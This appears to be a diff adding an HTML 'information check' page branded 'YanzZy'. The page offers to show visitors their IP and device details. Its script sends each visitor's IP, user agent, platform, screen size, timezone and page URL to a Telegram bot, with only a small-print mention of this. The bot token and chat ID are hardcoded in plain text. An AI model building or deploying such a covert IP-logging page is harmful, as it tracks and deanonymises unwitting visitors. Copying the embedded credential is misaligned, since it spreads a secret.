@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YanzZy Information Check</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+        }
+        .container {
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 500px;
+            padding: 30px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .banner {
+            width: 100%;
+            height: 180px;
+            background: linear-gradient(135deg, #6e8efb, #a777e3);
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+        .banner-text {
+            color: white;
+            font-size: 28px;
+            font-weight: bold;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+        .info-box {
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #e9ecef;
+        }
+        .info-item:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+        .label {
+            font-weight: bold;
+            color: #6c757d;
+        }
+        .value {
+            text-align: right;
+            color: #212529;
+        }
+        button {
+            background: linear-gradient(135deg, #6e8efb, #a777e3);
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(110, 142, 251, 0.3);
+        }
+        .disclaimer {
+            font-size: 12px;
+            color: #6c757d;
+            margin-top: 20px;
+            line-height: 1.5;
+        }
+        .logo {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: absolute;
+            top: -50px;
+            left: 50%;
+            transform: translateX(-50%);
+            border: 5px solid white;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        .logo img {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://placehold.co/100x100" alt="YanzZy logo - Purple and blue gradient circle with white YZ initials in a modern font" />
+        </div>
+        
+        <div class="banner">
+            <div class="banner-text">YanzZy Is Here</div>
+        </div>
+        
+        <p>Click below to check your device information and IP address</p>
+        
+        <div class="info-box">
+            <div class="info-item">
+                <span class="label">Your IP:</span>
+                <span class="value" id="ip-address">Not detected yet</span>
+            </div>
+            <div class="info-item">
+                <span class="label">Browser:</span>
+                <span class="value" id="browser-info">Not detected yet</span>
+            </div>
+            <div class="info-item">
+                <span class="label">OS:</span>
+                <span class="value" id="os-info">Not detected yet</span>
+            </div>
+            <div class="info-item">
+                <span class="label">Screen Size:</span>
+                <span class="value" id="screen-size">Not detected yet</span>
+            </div>
+            <div class="info-item">
+                <span class="label">Language:</span>
+                <span class="value" id="language">Not detected yet</span>
+            </div>
+        </div>
+        
+        <button id="check-btn">Check My Information</button>
+        
+        <p class="disclaimer" id="battery-warning">
+            Note: Battery status and cellular provider information require explicit permission and are not always accessible due to browser security restrictions.
+        </p>
+        <p class="disclaimer">
+            This service uses Telegram for notifications. Information collected will be sent to the configured Telegram bot.
+        </p>
+    </div>
+
+    <script>
+        const telegramBotToken = '7875963831:AAG2nLBMJcZePZdVHeoqXS2ekL-kPRCl3fQ';
+        const chatId = '8106298854';
+        
+        document.getElementById('check-btn').addEventListener('click', async function() {
+            try {
+                // Get public IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                // Update UI with basic information
+                document.getElementById('ip-address').textContent = ipData.ip;
+                document.getElementById('browser-info').textContent = getBrowser();
+                document.getElementById('os-info').textContent = getOS();
+                document.getElementById('screen-size').textContent = `${window.screen.width}x${window.screen.height}`;
+                document.getElementById('language').textContent = navigator.language || navigator.userLanguage;
+                
+                // Try to get battery status (if supported)
+                if ('getBattery' in navigator) {
+                    navigator.getBattery().then(battery => {
+                        document.getElementById('battery-warning').textContent = 
+                            `Battery: ${Math.round(battery.level * 100)}% ${battery.charging ? "(Charging)" : ""}`;
+                    });
+                }
+                
+                // Prepare data to send to Telegram
+                const data = {
+                    ip: ipData.ip,
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    screenWidth: window.screen.width,
+                    screenHeight: window.screen.height,
+                    language: navigator.language || navigator.userLanguage,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    pageUrl: window.location.href,
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Send to Telegram
+                if (telegramBotToken && chatId) {
+                    const text = `📱 YanzZy Info Check\n\n` +
+                                `🌐 IP: ${data.ip}\n` +
+                                `💻 Device: ${data.platform}\n` +
+                                `🖥️ Screen: ${data.screenWidth}x${data.screenHeight}\n` +
+                                `📅 Timezone: ${data.timezone}\n` +
+                                `📄 Page: ${data.pageUrl}\n` +
+                                `User Agent: ${data.userAgent}`;
+                    
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: text
+                        })
+                    }).catch(e => console.log('Telegram send error:', e));
+                }
+                
+            } catch (error) {
+                console.error('Error detecting information:', error);
+                alert('Unable to gather all information. Some details may not be available due to browser restrictions.');
+            }
+        });
+        
+        // Helper functions
+        function getBrowser() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.indexOf("Firefox") > -1) return "Firefox";
+            if (userAgent.indexOf("SamsungBrowser") > -1) return "Samsung Internet";
+            if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) return "Opera";
+            if (userAgent.indexOf("Trident") > -1) return "Internet Explorer";
+            if (userAgent.indexOf("Edge") > -1) return "Edge";
+            if (userAgent.indexOf("Chrome") > -1) return "Chrome";
+            if (userAgent.indexOf("Safari") > -1) return "Safari";
+            return "Unknown";
+        }
+        
+        function getOS() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.indexOf("Windows") > -1) return "Windows";
+            if (userAgent.indexOf("Mac") > -1) return "MacOS";
+            if (userAgent.indexOf("Linux") > -1) return "Linux";
+            if (userAgent.indexOf("Android") > -1) return "Android";
+            if (userAgent.indexOf("like Mac") > -1) return "iOS";
+            return "Unknown";
+        }
+    </script>
+</body>
+</html>
